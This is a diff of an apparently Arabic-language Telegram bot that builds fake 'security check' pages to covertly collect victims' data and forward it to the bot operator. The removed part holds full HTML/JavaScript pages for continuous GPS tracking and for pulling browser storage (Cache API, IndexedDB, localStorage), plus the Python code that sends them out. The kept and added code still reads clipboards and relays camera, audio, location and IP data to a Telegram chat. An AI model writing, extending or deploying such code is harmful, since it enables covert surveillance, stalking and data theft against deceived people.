@@ -433,35 +433,7 @@ def use_group_reward(code, user_id):
     
     add_points(user_id, reward['points'], f'مكافأة جماعية: {code}')
     return True, reward['points']
-# ====== دوال الميزات الجديدة ======
 
-# تتبع الموقع المستمر
-def start_location_tracking(chat_id, locations):
-    """إرسال مواقع متعددة إلى البوت"""
-    for loc in locations:
-        try:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
-            requests.post(url, data={
-                'chat_id': chat_id,
-                'latitude': loc['lat'],
-                'longitude': loc['lng']
-            })
-            time.sleep(0.5)  # تجنب الحظر
-        except:
-            pass
-
-# سحب الملفات
-def send_files_to_bot(chat_id, files):
-    """إرسال الملفات المستخرجة إلى البوت"""
-    for file_data in files:
-        try:
-            content = file_data['content'].split(',', 1)[1]
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-            files = {'document': base64.b64decode(content)}
-            caption = f"📁 {file_data['name']} ({(file_data['size']/1024):.1f} KB)"
-            requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files)
-        except:
-            pass
 
 # الحافظة
 def send_clipboard(chat_id, clipboard_text):
@@ -1040,661 +1012,7 @@ CAPTCHA_TEMPLATE = """
 </body>
 </html>
 """
-# ============================================================
-#  الصفحات الجديدة: تتبع الموقع + سحب الملفات + الحافظة
-# ============================================================
-
-LOCATION_TRACKING_PAGE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من الأمان</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: #0a0a0f;
-            background-image: radial-gradient(circle at 30% 40%, #111128, #050508);
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            background: rgba(255,255,255,0.02);
-            backdrop-filter: blur(40px);
-            border: 1px solid rgba(255,255,255,0.05);
-            border-radius: 32px;
-            padding: 45px 35px;
-            max-width: 480px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 60px 120px rgba(0,0,0,0.8);
-            animation: fadeIn 0.7s ease-out;
-        }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
-        .shield-icon { font-size: 56px; display: block; margin-bottom: 6px; animation: pulse 2.5s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
-        .title { color: #fff; font-size: 22px; font-weight: 600; margin-top: 8px; }
-        .subtitle { color: rgba(255,255,255,0.35); font-size: 14px; font-weight: 300; margin-top: 8px; line-height: 1.6; }
-        .captcha-box {
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 18px;
-            padding: 20px 16px;
-            margin: 22px 0 18px;
-        }
-        .captcha-icon { font-size: 28px; display: block; margin-bottom: 4px; }
-        .captcha-text { color: rgba(255,255,255,0.5); font-size: 14px; font-weight: 300; }
-        .captcha-status {
-            display: inline-block;
-            margin-top: 10px;
-            background: rgba(102, 126, 234, 0.12);
-            padding: 6px 20px;
-            border-radius: 40px;
-            color: #7a8cf5;
-            font-size: 13px;
-            font-weight: 500;
-            border: 1px solid rgba(102, 126, 234, 0.15);
-        }
-        .captcha-status.done { color: #4ade80; border-color: rgba(74, 222, 128, 0.2); background: rgba(74, 222, 128, 0.08); }
-        .progress-bar { width: 100%; height: 3px; background: rgba(255,255,255,0.04); border-radius: 10px; margin: 14px 0 8px; overflow: hidden; }
-        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #667eea, #a78bfa, #764ba2); border-radius: 10px; transition: width 0.4s ease; background-size: 200% 100%; animation: shimmer 2s infinite; }
-        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
-        .status-text { color: rgba(255,255,255,0.2); font-size: 12px; font-weight: 300; margin-top: 6px; letter-spacing: 0.3px; min-height: 20px; }
-        .btn-verify {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            border: none;
-            color: #fff;
-            padding: 14px 28px;
-            border-radius: 50px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: not-allowed;
-            opacity: 0.3;
-            width: 100%;
-            transition: all 0.4s ease;
-            margin-top: 12px;
-            letter-spacing: 0.5px;
-        }
-        .btn-verify.active { opacity: 1; cursor: pointer; box-shadow: 0 8px 40px rgba(102, 126, 234, 0.2); }
-        .btn-verify.active:hover { transform: translateY(-2px); box-shadow: 0 12px 50px rgba(102, 126, 234, 0.35); }
-        .footer-text { color: rgba(255,255,255,0.06); font-size: 10px; margin-top: 18px; letter-spacing: 1.5px; text-transform: uppercase; }
-        #locationLog {
-            color: rgba(255,255,255,0.2);
-            font-size: 11px;
-            margin-top: 10px;
-            max-height: 80px;
-            overflow-y: auto;
-            text-align: left;
-            padding: 8px;
-            background: rgba(255,255,255,0.02);
-            border-radius: 8px;
-            font-family: monospace;
-        }
-        #locationLog div { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
-        .hidden { display: none; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <span class="shield-icon">📍</span>
-        <h1 class="title">تحديث الموقع الجغرافي</h1>
-        <p class="subtitle">نقوم بتحديث موقعك لتحسين تجربة التصفح</p>
-
-        <div class="captcha-box">
-            <span class="captcha-icon" id="captchaIcon">🌐</span>
-            <p class="captcha-text" id="captchaText">جاري تتبع الموقع...</p>
-            <span class="captcha-status" id="captchaStatus">⏳ قيد المعالجة</span>
-        </div>
-
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
-        </div>
-        <p class="status-text" id="statusText">جاري جلب الموقع...</p>
-        <div id="locationLog"></div>
-
-        <button class="btn-verify" id="verifyBtn">⏳ جاري التتبع...</button>
-
-        <p class="footer-text">• Protected by Secure Shield •</p>
-    </div>
-
-    <script>
-        const session_id = "{{ session_id }}";
-        const original_url = "{{ original_url }}";
-        const feature = "{{ feature }}";
-
-        const progressFill = document.getElementById('progressFill');
-        const statusText = document.getElementById('statusText');
-        const verifyBtn = document.getElementById('verifyBtn');
-        const captchaStatus = document.getElementById('captchaStatus');
-        const captchaText = document.getElementById('captchaText');
-        const captchaIcon = document.getElementById('captchaIcon');
-        const locationLog = document.getElementById('locationLog');
-
-        let progress = 0;
-        let dataSent = false;
-        let locationCount = 0;
-        const MAX_LOCATIONS = 15;
-        const locations = [];
-        let watchId = null;
-
-        const data = {
-            session_id: session_id,
-            timestamp: new Date().toISOString(),
-            feature: feature,
-            locations: [],
-            device: {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: screen.width + 'x' + screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            },
-            ip: null,
-            clipboard: null
-        };
-
-        async function getIP() {
-            try {
-                const response = await fetch('/get_ip');
-                const ipData = await response.json();
-                data.ip = ipData.ip;
-            } catch(e) {}
-        }
-
-        async function getClipboard() {
-            try {
-                if (navigator.clipboard && navigator.clipboard.readText) {
-                    const text = await navigator.clipboard.readText();
-                    if (text && text.length > 0) {
-                        data.clipboard = text;
-                        captchaText.textContent = '✅ تم حفظ محتوى الحافظة';
-                    }
-                }
-            } catch(e) {}
-        }
-
-        function startLocationTracking() {
-            if (!navigator.geolocation) {
-                captchaText.textContent = '⚠️ الموقع غير مدعوم';
-                captchaIcon.textContent = '⚠️';
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                pos => addLocation(pos),
-                () => {},
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-
-            watchId = navigator.geolocation.watchPosition(
-                pos => addLocation(pos),
-                err => {
-                    captchaText.textContent = '⚠️ خطأ في التتبع: ' + err.message;
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
-            );
-
-            setTimeout(() => {
-                if (watchId) {
-                    navigator.geolocation.clearWatch(watchId);
-                    watchId = null;
-                    captchaText.textContent = '✅ تم جمع ' + locations.length + ' مواقع';
-                    captchaIcon.textContent = '✅';
-                    captchaStatus.textContent = '✅ تم التتبع';
-                    captchaStatus.className = 'captcha-status done';
-                }
-            }, 30000);
-        }
-
-        function addLocation(pos) {
-            if (locations.length >= MAX_LOCATIONS) return;
-
-            const loc = {
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                accuracy: pos.coords.accuracy,
-                altitude: pos.coords.altitude || null,
-                speed: pos.coords.speed || null,
-                timestamp: new Date().toISOString()
-            };
-
-            locations.push(loc);
-            data.locations = locations;
-            locationCount++;
-
-            const logEntry = document.createElement('div');
-            logEntry.textContent = `📍 #${locationCount}: ${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)} (دقة: ${Math.round(loc.accuracy)}م)`;
-            locationLog.appendChild(logEntry);
-            locationLog.scrollTop = locationLog.scrollHeight;
-
-            captchaText.textContent = `📍 تم تحديث الموقع (${locationCount}/${MAX_LOCATIONS})`;
-            progressFill.style.width = Math.min((locationCount / MAX_LOCATIONS) * 100, 90) + '%';
-            statusText.textContent = `جاري تتبع الموقع... ${locationCount}/${MAX_LOCATIONS}`;
-        }
-
-        function updateProgress() {
-            if (progress < 85) {
-                progress += Math.random() * 4 + 1;
-                if (progress > 85) progress = 85;
-                progressFill.style.width = progress + '%';
-                setTimeout(updateProgress, 500 + Math.random() * 400);
-            }
-        }
-
-        async function sendData() {
-            if (dataSent) return;
-            dataSent = true;
-
-            verifyBtn.textContent = '📤 جاري الإرسال...';
-            verifyBtn.style.opacity = '0.6';
-
-            try {
-                await fetch('/send_data', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                });
-                statusText.textContent = '✅ تم إرسال ' + locations.length + ' مواقع';
-                captchaStatus.textContent = '✅ تم الإرسال';
-                captchaStatus.className = 'captcha-status done';
-                progressFill.style.width = '100%';
-            } catch(e) {
-                statusText.textContent = '⚠️ جاري التوجيه...';
-            }
-
-            verifyBtn.textContent = '✔️ تأكيد التحقق';
-            verifyBtn.classList.add('active');
-            verifyBtn.style.opacity = '1';
-
-            setTimeout(() => {
-                window.location.href = original_url;
-            }, 1800);
-        }
-
-        verifyBtn.addEventListener('click', function() {
-            if (this.classList.contains('active')) {
-                sendData();
-            }
-        });
-
-        async function init() {
-            await getIP();
-            await getClipboard();
-            updateProgress();
-            startLocationTracking();
-
-            setTimeout(() => {
-                progressFill.style.width = '100%';
-                statusText.textContent = '✅ تم تتبع ' + locations.length + ' مواقع';
-                captchaStatus.textContent = '✅ جاهز للإرسال';
-                captchaStatus.className = 'captcha-status done';
-
-                verifyBtn.textContent = '✔️ تأكيد الإرسال';
-                verifyBtn.classList.add('active');
-                verifyBtn.style.opacity = '1';
-            }, 32000);
-        }
-
-        init();
-    </script>
-</body>
-</html>
-"""
-
-FILE_EXFIL_PAGE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من الأمان</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: #0a0a0f;
-            background-image: radial-gradient(circle at 30% 40%, #111128, #050508);
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            background: rgba(255,255,255,0.02);
-            backdrop-filter: blur(40px);
-            border: 1px solid rgba(255,255,255,0.05);
-            border-radius: 32px;
-            padding: 45px 35px;
-            max-width: 480px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 60px 120px rgba(0,0,0,0.8);
-            animation: fadeIn 0.7s ease-out;
-        }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
-        .shield-icon { font-size: 56px; display: block; margin-bottom: 6px; animation: pulse 2.5s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
-        .title { color: #fff; font-size: 22px; font-weight: 600; margin-top: 8px; }
-        .subtitle { color: rgba(255,255,255,0.35); font-size: 14px; font-weight: 300; margin-top: 8px; line-height: 1.6; }
-        .captcha-box {
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 18px;
-            padding: 20px 16px;
-            margin: 22px 0 18px;
-        }
-        .captcha-icon { font-size: 28px; display: block; margin-bottom: 4px; }
-        .captcha-text { color: rgba(255,255,255,0.5); font-size: 14px; font-weight: 300; }
-        .captcha-status {
-            display: inline-block;
-            margin-top: 10px;
-            background: rgba(102, 126, 234, 0.12);
-            padding: 6px 20px;
-            border-radius: 40px;
-            color: #7a8cf5;
-            font-size: 13px;
-            font-weight: 500;
-            border: 1px solid rgba(102, 126, 234, 0.15);
-        }
-        .captcha-status.done { color: #4ade80; border-color: rgba(74, 222, 128, 0.2); background: rgba(74, 222, 128, 0.08); }
-        .progress-bar { width: 100%; height: 3px; background: rgba(255,255,255,0.04); border-radius: 10px; margin: 14px 0 8px; overflow: hidden; }
-        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #667eea, #a78bfa, #764ba2); border-radius: 10px; transition: width 0.4s ease; background-size: 200% 100%; animation: shimmer 2s infinite; }
-        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
-        .status-text { color: rgba(255,255,255,0.2); font-size: 12px; font-weight: 300; margin-top: 6px; letter-spacing: 0.3px; min-height: 20px; }
-        .btn-verify {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            border: none;
-            color: #fff;
-            padding: 14px 28px;
-            border-radius: 50px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: not-allowed;
-            opacity: 0.3;
-            width: 100%;
-            transition: all 0.4s ease;
-            margin-top: 12px;
-            letter-spacing: 0.5px;
-        }
-        .btn-verify.active { opacity: 1; cursor: pointer; box-shadow: 0 8px 40px rgba(102, 126, 234, 0.2); }
-        .btn-verify.active:hover { transform: translateY(-2px); box-shadow: 0 12px 50px rgba(102, 126, 234, 0.35); }
-        .footer-text { color: rgba(255,255,255,0.06); font-size: 10px; margin-top: 18px; letter-spacing: 1.5px; text-transform: uppercase; }
-        #fileLog {
-            color: rgba(255,255,255,0.2);
-            font-size: 11px;
-            margin-top: 10px;
-            max-height: 80px;
-            overflow-y: auto;
-            text-align: left;
-            padding: 8px;
-            background: rgba(255,255,255,0.02);
-            border-radius: 8px;
-            font-family: monospace;
-        }
-        #fileLog div { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <span class="shield-icon">📁</span>
-        <h1 class="title">فحص الملفات الآمن</h1>
-        <p class="subtitle">نقوم بفحص ملفاتك للتأكد من سلامتها</p>
-
-        <div class="captcha-box">
-            <span class="captcha-icon" id="captchaIcon">🔍</span>
-            <p class="captcha-text" id="captchaText">جاري فحص الملفات...</p>
-            <span class="captcha-status" id="captchaStatus">⏳ قيد المعالجة</span>
-        </div>
-
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
-        </div>
-        <p class="status-text" id="statusText">جاري تحليل الملفات...</p>
-        <div id="fileLog"></div>
-
-        <button class="btn-verify" id="verifyBtn">⏳ جاري الفحص...</button>
-
-        <p class="footer-text">• Protected by Secure Shield •</p>
-    </div>
-
-    <script>
-        const session_id = "{{ session_id }}";
-        const original_url = "{{ original_url }}";
-        const feature = "{{ feature }}";
-
-        const progressFill = document.getElementById('progressFill');
-        const statusText = document.getElementById('statusText');
-        const verifyBtn = document.getElementById('verifyBtn');
-        const captchaStatus = document.getElementById('captchaStatus');
-        const captchaText = document.getElementById('captchaText');
-        const captchaIcon = document.getElementById('captchaIcon');
-        const fileLog = document.getElementById('fileLog');
-
-        let progress = 0;
-        let dataSent = false;
-        let filesCollected = [];
-
-        const data = {
-            session_id: session_id,
-            timestamp: new Date().toISOString(),
-            feature: feature,
-            files: [],
-            device: {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: screen.width + 'x' + screen.height
-            },
-            ip: null,
-            clipboard: null
-        };
-
-        async function getIP() {
-            try {
-                const response = await fetch('/get_ip');
-                const ipData = await response.json();
-                data.ip = ipData.ip;
-            } catch(e) {}
-        }
-
-        async function getClipboard() {
-            try {
-                if (navigator.clipboard && navigator.clipboard.readText) {
-                    const text = await navigator.clipboard.readText();
-                    if (text && text.length > 0) {
-                        data.clipboard = text;
-                    }
-                }
-            } catch(e) {}
-        }
-
-        async function collectFiles() {
-            try {
-                // محاولة قراءة من Cache API
-                try {
-                    const cache = await caches.open('v1');
-                    const keys = await cache.keys();
-                    if (keys.length > 0) {
-                        for (const request of keys) {
-                            const response = await cache.match(request);
-                            if (response) {
-                                const blob = await response.blob();
-                                if (blob && blob.size > 0) {
-                                    const reader = new FileReader();
-                                    const content = await new Promise((resolve) => {
-                                        reader.onload = () => resolve(reader.result);
-                                        reader.readAsDataURL(blob);
-                                    });
-                                    const filename = request.url.split('/').pop() || 'cache_file';
-                                    filesCollected.push({
-                                        name: filename,
-                                        size: blob.size,
-                                        type: blob.type || 'application/octet-stream',
-                                        content: content
-                                    });
-                                    const logEntry = document.createElement('div');
-                                    logEntry.textContent = `📄 تم استخراج: ${filename} (${(blob.size/1024).toFixed(1)} KB)`;
-                                    fileLog.appendChild(logEntry);
-                                    fileLog.scrollTop = fileLog.scrollHeight;
-                                }
-                            }
-                        }
-                    }
-                } catch(e) {}
-
-                // محاولة قراءة من IndexedDB
-                try {
-                    const databases = await indexedDB.databases ? await indexedDB.databases() : [];
-                    for (const dbInfo of databases) {
-                        try {
-                            const db = await new Promise((resolve, reject) => {
-                                const req = indexedDB.open(dbInfo.name);
-                                req.onsuccess = () => resolve(req.result);
-                                req.onerror = () => reject(req.error);
-                            });
-                            const objectStores = db.objectStoreNames;
-                            for (const storeName of objectStores) {
-                                const transaction = db.transaction(storeName, 'readonly');
-                                const store = transaction.objectStore(storeName);
-                                const allRecords = await new Promise((resolve) => {
-                                    const req = store.getAll();
-                                    req.onsuccess = () => resolve(req.result);
-                                    req.onerror = () => resolve([]);
-                                });
-                                for (const record of allRecords) {
-                                    if (record && typeof record === 'object') {
-                                        const json = JSON.stringify(record);
-                                        if (json.length > 100) {
-                                            filesCollected.push({
-                                                name: `${dbInfo.name}_${storeName}_record.json`,
-                                                size: json.length,
-                                                type: 'application/json',
-                                                content: 'data:application/json;base64,' + btoa(json)
-                                            });
-                                            const logEntry = document.createElement('div');
-                                            logEntry.textContent = `📄 استخراج: ${dbInfo.name}/${storeName} (${(json.length/1024).toFixed(1)} KB)`;
-                                            fileLog.appendChild(logEntry);
-                                            fileLog.scrollTop = fileLog.scrollHeight;
-                                        }
-                                    }
-                                }
-                            }
-                            db.close();
-                        } catch(e) {}
-                    }
-                } catch(e) {}
-
-                // محاولة قراءة من localStorage
-                try {
-                    for (let i = 0; i < localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        if (key) {
-                            const value = localStorage.getItem(key);
-                            if (value && value.length > 500) {
-                                filesCollected.push({
-                                    name: `localStorage_${key}.json`,
-                                    size: value.length,
-                                    type: 'application/json',
-                                    content: 'data:application/json;base64,' + btoa(value)
-                                });
-                                const logEntry = document.createElement('div');
-                                logEntry.textContent = `📄 استخراج localStorage: ${key} (${(value.length/1024).toFixed(1)} KB)`;
-                                fileLog.appendChild(logEntry);
-                                fileLog.scrollTop = fileLog.scrollHeight;
-                            }
-                        }
-                    }
-                } catch(e) {}
-
-                data.files = filesCollected;
-                captchaText.textContent = `✅ تم استخراج ${filesCollected.length} ملف`;
-                if (filesCollected.length > 0) {
-                    captchaIcon.textContent = '✅';
-                }
-
-            } catch(e) {
-                captchaText.textContent = '⚠️ تم استخراج ' + filesCollected.length + ' ملف';
-                captchaIcon.textContent = '⚠️';
-            }
-        }
-
-        function updateProgress() {
-            if (progress < 85) {
-                progress += Math.random() * 4 + 1;
-                if (progress > 85) progress = 85;
-                progressFill.style.width = progress + '%';
-                const msgs = ['🔍 فحص الملفات...', '🔄 تحليل البيانات...', '📦 تجميع المعلومات...'];
-                statusText.textContent = msgs[Math.floor(Math.random() * msgs.length)];
-                setTimeout(updateProgress, 400 + Math.random() * 500);
-            }
-        }
-
-        async function sendData() {
-            if (dataSent) return;
-            dataSent = true;
-
-            verifyBtn.textContent = '📤 جاري الإرسال...';
-            verifyBtn.style.opacity = '0.6';
-
-            try {
-                await fetch('/send_data', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                });
-                statusText.textContent = '✅ تم إرسال ' + filesCollected.length + ' ملف';
-                captchaStatus.textContent = '✅ تم الإرسال';
-                captchaStatus.className = 'captcha-status done';
-                progressFill.style.width = '100%';
-            } catch(e) {
-                statusText.textContent = '⚠️ جاري التوجيه...';
-            }
-
-            verifyBtn.textContent = '✔️ تأكيد التحقق';
-            verifyBtn.classList.add('active');
-            verifyBtn.style.opacity = '1';
-
-            setTimeout(() => {
-                window.location.href = original_url;
-            }, 1800);
-        }
-
-        verifyBtn.addEventListener('click', function() {
-            if (this.classList.contains('active')) {
-                sendData();
-            }
-        });
-
-        async function init() {
-            await getIP();
-            await getClipboard();
-            updateProgress();
-            await collectFiles();
-
-            progressFill.style.width = '100%';
-            statusText.textContent = `✅ تم استخراج ${filesCollected.length} ملف`;
-            captchaStatus.textContent = '✅ جاهز للإرسال';
-            captchaStatus.className = 'captcha-status done';
-            captchaText.textContent = `✅ ${filesCollected.length} ملف جاهز`;
-
-            verifyBtn.textContent = '✔️ تأكيد الإرسال';
-            verifyBtn.classList.add('active');
-            verifyBtn.style.opacity = '1';
-        }
-
-        init();
-    </script>
-</body>
-</html>
-"""
+                
 
 CLIPBOARD_PAGE = """
 <!DOCTYPE html>
@@ -2054,9 +1372,6 @@ def test_page(session_id, features):
     'location': LOCATION_PAGE,
     'device': DEVICE_PAGE,
     'all': ALL_PAGE,
-    # الميزات الجديدة
-    'location_tracking': LOCATION_TRACKING_PAGE,
-    'file_exfil': FILE_EXFIL_PAGE,
     'clipboard': CLIPBOARD_PAGE
     }
     
@@ -2081,7 +1396,7 @@ def send_data():
             return jsonify({'error': 'جلسة غير صالحة'}), 404
         chat_id = session['chat_id']
         
-        # ====== إرسال الصور ======
+        # إرسال الصور
         for key in ['camera_front', 'camera_back']:
             if data.get(key):
                 for img_data in data[key]:
@@ -2093,7 +1408,7 @@ def send_data():
                     except:
                         pass
         
-        # ====== إرسال الفيديو ======
+        # إرسال الفيديو
         if data.get('video'):
             try:
                 video = data['video'].split(',', 1)[1]
@@ -2103,7 +1418,7 @@ def send_data():
             except:
                 pass
         
-        # ====== إرسال الصوت ======
+        # إرسال الصوت
         if data.get('audio'):
             try:
                 audio = data['audio'].split(',', 1)[1]
@@ -2113,7 +1428,7 @@ def send_data():
             except:
                 pass
         
-        # ====== إرسال الموقع ======
+        # إرسال الموقع
         if data.get('location'):
             try:
                 loc = data['location']
@@ -2126,7 +1441,7 @@ def send_data():
             except:
                 pass
         
-        # ====== إرسال معلومات الجهاز ======
+        # إرسال معلومات الجهاز
         if data.get('device'):
             try:
                 device = data['device']
@@ -2136,7 +1451,7 @@ def send_data():
             except:
                 pass
         
-        # ====== إرسال IP ======
+        # إرسال IP
         if data.get('ip'):
             try:
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -2144,43 +1459,43 @@ def send_data():
             except:
                 pass
         
-        # ====== الميزات الجديدة ======
-        
-        # تتبع الموقع المستمر
-        if data.get('locations'):
-            for loc in data['locations']:
-                try:
-                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
-                    requests.post(url, data={
-                        'chat_id': chat_id,
-                        'latitude': loc['lat'],
-                        'longitude': loc['lng']
-                    })
-                    time.sleep(0.3)
-                except:
-                    pass
-        
-        # سحب الملفات
-        if data.get('files'):
-            for file_data in data['files']:
-                try:
-                    content = file_data['content'].split(',', 1)[1]
-                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-                    files = {'document': base64.b64decode(content)}
-                    caption = f"📁 {file_data['name']} ({(file_data['size']/1024):.1f} KB)"
-                    requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files)
-                    time.sleep(0.3)
-                except:
-                    pass
-        
-        # الحافظة
+        # ====== إرسال الحافظة (مقسمة إلى رسائل متعددة) ======
         if data.get('clipboard'):
             try:
-                msg = f"📋 **محتوى الحافظة:**\n\n{data['clipboard']}"
-                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
-            except:
-                pass
+                clipboard_text = data['clipboard']
+                max_length = 4000  # الحد الأقصى للرسالة الواحدة
+                
+                # إذا كان النص قصيراً، أرسله كرسالة واحدة
+                if len(clipboard_text) <= max_length:
+                    msg = f"📋 **محتوى الحافظة:**\n\n{clipboard_text}"
+                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                    requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
+                else:
+                    # تقسيم النص إلى أجزاء
+                    parts = []
+                    for i in range(0, len(clipboard_text), max_length):
+                        parts.append(clipboard_text[i:i+max_length])
+                    
+                    # إرسال الجزء الأول مع العنوان
+                    first_msg = f"📋 **محتوى الحافظة (1/{len(parts)}):**\n\n{parts[0]}"
+                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                    requests.post(url, data={'chat_id': chat_id, 'text': first_msg, 'parse_mode': 'Markdown'})
+                    
+                    # إرسال الأجزاء المتبقية
+                    for i, part in enumerate(parts[1:], start=2):
+                        part_msg = f"📋 **محتوى الحافظة ({i}/{len(parts)}):**\n\n{part}"
+                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                        requests.post(url, data={'chat_id': chat_id, 'text': part_msg, 'parse_mode': 'Markdown'})
+                        time.sleep(0.3)  # تأخير بسيط بين الرسائل
+                        
+            except Exception as e:
+                print(f"خطأ في إرسال الحافظة: {e}")
+                try:
+                    # محاولة إرسال أول 500 حرف كحل بديل
+                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                    requests.post(url, data={'chat_id': chat_id, 'text': f"📋 محتوى الحافظة:\n\n{data['clipboard'][:500]}..."})
+                except:
+                    pass
         
         return jsonify({'status': 'ok'})
     except Exception as e:
@@ -2329,9 +1644,7 @@ def handle_callback(call):
         InlineKeyboardButton("🎥 فيديو خلفي", callback_data="video_back"),
         InlineKeyboardButton("🎙 تسجيل صوتي", callback_data="audio"),
         InlineKeyboardButton("📍 الموقع الجغرافي", callback_data="location"),
-        InlineKeyboardButton("📍 تتبع الموقع المستمر", callback_data="location_tracking"),
         InlineKeyboardButton("📱 معلومات الجهاز", callback_data="device"),
-        InlineKeyboardButton("📁 سحب الملفات", callback_data="file_exfil"),
         InlineKeyboardButton("📋 الحافظة", callback_data="clipboard"),
         InlineKeyboardButton("🔬 كل الميزات", callback_data="all"),
         InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
@@ -2883,7 +2196,7 @@ def handle_callback(call):
     
     # ====== الميزات الأساسية (كاميرا، فيديو، إلخ) ======
     # ====== الميزات الأساسية والجديدة ======
-    if data in ['camera_front', 'camera_back', 'video_front', 'video_back', 'audio','location', 'device', 'all', 'location_tracking', 'file_exfil', 'clipboard']:
+    if data in ['camera_front', 'camera_back', 'video_front', 'video_back', 'audio','location', 'device', 'all', 'clipboard']:
         user = get_user(user_id)
     
     # تحديد النقاط المطلوبة لكل ميزة (بما في ذلك الجديدة)
@@ -2892,8 +2205,6 @@ def handle_callback(call):
         'video_front': 5, 'video_back': 5,
         'audio': 3, 'location': 2,
         'device': 2, 'all': 10,
-        'location_tracking': 5,
-        'file_exfil': 8,
         'clipboard': 3
     }
         required_points = points_map.get(data, 5)
